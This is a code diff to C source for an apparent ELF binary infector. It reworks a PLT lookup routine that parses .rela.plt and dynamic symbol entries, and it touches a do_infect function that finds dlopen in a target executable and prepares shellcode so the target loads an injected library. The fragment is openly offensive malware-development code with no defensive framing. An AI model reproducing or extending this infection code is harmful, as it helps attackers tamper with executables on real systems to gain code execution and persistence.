@@ -39,6 +39,8 @@
 #define ELF_PT_LOAD			0x01
 #define ELF_EXEC_FLAGS			0x11
 #define ELF_STRTAB_SIZE			24
+#define ELF_RELENT_SIZE			24
+#define ELF_RELENT_SYM			12
 
 #define START_REXMOV_CODE		((char[]){0x48, 0xc7, 0xc7})
 #define START_REXMOV_LEN		3 
@@ -68,7 +70,6 @@ typedef struct empty_area_t {
 } empty_area_t;
 
 typedef struct plt_entry_t {
-	uint64_t fileoffset;
 	uint64_t vaddr;
 } plt_entry_t;
 
@@ -395,18 +396,21 @@ int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt) {
 	printf ("link @ %p %lx\n", (void*)(linkptr - elf_base), linksz);
 	printf ("linklink @ %p %lx\n", (void*)(linklinkptr - elf_base), linklinksz);
 	// print out the rela.plt
-	for (i=0; i<relapltsz; i += sizeof(uint64_t)) {
-		printf("%016lx%s", *(uint64_t*)(relapltptr + i), ((i+8)%24)?" ":"\n");
+	for (i=0; i<relapltsz; i += ELF_RELENT_SIZE) {
+		uint32_t symoff = *(uint32_t*)(relapltptr + i + ELF_RELENT_SYM);
+		char* sym = (char*)linklinkptr + *(uint32_t*)(linkptr + (symoff * ELF_STRTAB_SIZE));
+		uint64_t vaddr = *(uint64_t*)(relapltptr+i);
+		printf("plt for %s is at %016lx\n", sym, vaddr);
+		if (strstr(sym, fun_name)) {
+			// found it
+			// this is the addr you want to jump to the value of
+			// jmp [this_vaddr]
+			plt->vaddr = vaddr;
+			return 0;
+		}
 	}
-	// print out the dynsym
-	// this is gross code, I should have just used elf.h
-	for (i=0; i<linksz; i += ELF_STRTAB_SIZE) {
-		printf("%s\n", linklinkptr + *(uint32_t*)(linkptr + i));
-	}
-	printf("\n");
-	
 
-	return 0;
+	return -1;
 }
 	
 
@@ -448,6 +452,8 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 		printf("Couldn't find dlopen!\n");
 		return -1;
 	}
+
+	printf("Found dlopen at %lx\n", dlopen_plt.vaddr);
 
 	// grab the shellcode
 
